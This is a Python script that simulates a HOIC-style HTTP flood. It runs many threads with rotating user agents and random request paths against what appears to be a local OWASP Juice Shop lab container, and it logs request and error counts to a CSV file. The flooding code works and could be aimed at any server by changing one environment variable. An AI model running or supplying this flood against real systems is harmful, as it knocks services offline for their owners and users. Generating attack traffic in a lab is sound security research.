import requests
import threading
import random
import time
import os
import pandas as pd

# Configuration
TARGET_URL = os.getenv("TARGET_URL", "http://juice-shop:3000")
DURATION = int(os.getenv("DURATION", "60"))
THREADS = int(os.getenv("THREADS", "100"))
DELAY = float(os.getenv("DELAY", "0.01"))
STATS_FILE = "/data/ddos_stats.csv"

# Realistic HOIC-style User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "HOIC/2.1 (DDoS Simulator; High Orbit Ion Cannon)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
]

# Random Paths to Flood
PATHS = [
    "/",
    "/#/about",
    "/#/contact",
    "/rest/products/search?q=apple",
    "/rest/products/search?q=banana",
    "/rest/products/search?q=orange",
    "/ftp",
    "/assets/public/images/products/apple_juice.jpg",
    "/assets/public/images/products/egg_box.jpg",
]

import socket

# Shared counter for statistics
stats = {"requests_sent": 0, "errors": 0}
stats_lock = threading.Lock()

def wait_for_service():
    print(f"[*] Waiting for {TARGET_URL} to be ready...")
    target_host = TARGET_URL.replace("http://", "").split(":")[0]
    target_port = 3000
    while True:
        try:
            with socket.create_connection((target_host, target_port), timeout=2):
                print("[+] Target is up!")
                break
        except (socket.timeout, ConnectionRefusedError, socket.gaierror):
            time.sleep(2)

def flood():
    session = requests.Session()
    end_time = time.time() + DURATION
    
    while time.time() < end_time:
        try:
            path = random.choice(PATHS)
            url = f"{TARGET_URL.rstrip('/')}{path}"
            
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Cache-Control": "no-cache",
                "Referer": TARGET_URL,
                "Connection": "keep-alive"
            }
            
            resp = session.get(url, headers=headers, timeout=2)
            
            with stats_lock:
                stats["requests_sent"] += 1
        except Exception:
            with stats_lock:
                stats["errors"] += 1
        
        if DELAY > 0:
            time.sleep(DELAY)

def main():
    wait_for_service()
    print(f"[*] Starting DDoS/HOIC simulation against {TARGET_URL}")
    print(f"[*] Threads: {THREADS}, Duration: {DURATION}s, Delay: {DELAY}s")
    
    threads_list = []
    for i in range(THREADS):
        t = threading.Thread(target=flood)
        threads_list.append(t)
        t.start()
        
    # Wait for all threads to finish
    for t in threads_list:
        t.join()
        
    print(f"[+] Simulation completed.")
    print(f"[+] Requests Sent: {stats['requests_sent']}")
    print(f"[+] Errors: {stats['errors']}")
    
    # Save statistics
    df_stats = pd.DataFrame([stats])
    df_stats.to_csv(STATS_FILE, index=False)
    print(f"[+] Statistics saved to {STATS_FILE}")

if __name__ == "__main__":
    main()
